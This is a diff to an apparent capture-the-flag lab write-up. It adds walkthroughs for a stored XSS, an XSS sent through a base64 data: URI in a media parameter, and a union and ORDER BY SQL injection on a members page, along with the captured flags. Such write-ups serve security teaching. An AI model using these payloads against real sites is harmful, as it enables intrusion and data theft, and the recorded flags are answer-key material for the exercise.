@@ -13,7 +13,9 @@ http://10.13.199.248/index.php?page=recover inspect element change reset email t
 Flag: 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
 ---
 
-Xss on feedback page, /><script>alert(1);</script>
+Xss on feedback page
+
+`/><script>alert(1);</script>`
 
 Flag: 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
 ---
@@ -66,3 +68,45 @@ for example javascript that might then be executed on another user's browser whe
 Flag: 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
 ---
 
+Image link XSS
+There is an image link on the main page: http://{ip}/?page=media&src=nsa
+Changing the src parameter we get a wrong answer page but what's interesting is that with for example &src=test123 the html will contain an object tag with our data: 
+
+![](./object_tag/Ressources/object_tag.png)
+
+By encoding javascript into the url using base64 we can get the flag:
+
+`<script>alert(1);</script>` 
+
+base64-> `PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=`
+
+http://{ip}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
+
+Flag: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
+---
+
+Members SQL injection
+
+Trying out different inputs we can find out information about the SQL server used, in this case by just inputting an apostrophe ' we find out the site is usingg MySQL which can aid us in constructing queries.
+
+Trying `1 OR 1=1` works and displays all users. The query might look something like this on the server:
+
+`SELECT name FROM members WHERE id = 1 OR 1=1`
+
+Since 1=1 is always true, it returns all the data in the table.
+Trying different inputs we can get information from the error messages.
+
+`1 union select 1,2,3 from user -- -`
+>Table 'Member_Sql_Injection.user' doesn't exist
+
+The table is called Member_Sql_Injection
+
+Trying 
+`1 or 1=1 ORDER BY 1--`, 
+
+`1 or 1=1 ORDER BY 2--` and 
+
+`1 or 1=1 ORDER BY 3--` 
+>Unknown column '3' in 'order clause'
+
+There are only 2 columns, first name and last name. 
